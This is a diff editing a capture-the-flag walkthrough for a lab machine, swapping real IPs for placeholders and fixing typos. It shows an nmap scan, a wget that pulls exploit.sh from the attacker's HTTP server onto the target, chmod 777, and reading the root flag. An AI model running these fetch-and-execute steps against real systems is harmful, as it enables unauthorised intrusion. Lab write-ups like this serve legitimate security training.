@@ -25,7 +25,7 @@ Next, start enumerating the machine using Nmap:
 
 ```bash
 
-nmap  -sV -sC -n -Pn --min-rate 3000 10.10.11.11 -vvv
+nmap  -sV -sC -n -Pn --min-rate 3000 $Lab_IP -vvv
 
 ```
 
@@ -86,11 +86,10 @@ python3 -m http.server 8080
 
 On the target machine:
 
-  
 
 ```bash
 
-wget  http://10.10.14.101:8080/exploit.sh
+wget  http://YourMachine_IP:8080/exploit.sh
 
 chmod  777  exploit.sh
 
@@ -98,11 +97,14 @@ chmod  777  exploit.sh
 
 ```
 
-Once in, as a root, execute a bash terminal by using the following comand
+Once in, as a root, execute a bash terminal by using the following command:
+
 ```bash
 bash
 ```
+
 Finally just navigate to `/root` and retrieve the flag, saved as `root.txt`
+
 ```bash
 cd /root
 cat root.txt
